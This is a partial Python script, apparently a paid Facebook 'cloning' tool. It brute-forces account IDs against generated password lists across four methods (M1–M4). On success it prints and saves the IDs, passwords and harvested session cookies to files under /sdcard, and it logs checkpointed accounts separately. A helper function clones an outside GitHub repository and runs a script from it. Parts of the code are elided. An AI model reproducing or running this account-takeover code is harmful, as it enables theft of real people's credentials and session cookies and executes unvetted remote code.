...
sys.stdout.write('\x1b]2; <[VAVA]>\x07')
logo=(f"""\033[1;37m
\033[1;32m[\033[1;31m-\033[1;32m] \033[134mYb    dP 88 Yb    dP    db    
 Yb  dP  88  Yb  dP    dPYb   
  YbdP   88   YbdP    dP__Yb  
   YP    88    YP    dP""""Yb ══════════════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mFACEBOK : \033[1;37mYOUCEF HAFAFNI 
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mGITHUB  : \033[1;37mMAFIAT-2
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mSERVICE : \033[1;37mPAID
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mVERSION : \033[1;37m3.21
\033[1;34m═════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;31mCloning ids Saved in MAFIA folder
\033[1;34m═════════════════════════════════════════""")
def linex():
    print('\033[1;34m═════════════════════════════════════════')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/'100071912544158)
                                menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[VIVA-M1]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[VIVA-OK]> '+ids+' | '+pas+'\033[1;97m')                 
                                        print("\033[1;33m [BISCUT-🇩🇿] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/VIVA_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAFIA_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[VIVA-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VIVA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/VIVA-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[VIVA-M2]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[VIVA-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🇩🇿] :\033[1;37m "+cookie)           
                                        open('/sdcard/VIVA_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAFIA_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[VIVA-M3]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[VIVA-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/VIVA_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAFIA_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\r\x1b[38;5;208m <[VIVA-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VIVA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[VIVA-M4]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def createip():
	os.system("cd && git clone https://github.com/VIVA2/X.A.Moha")
	os.system('cd && cd X.A.Moha ;python IP16.py')
#####_____END_____#####
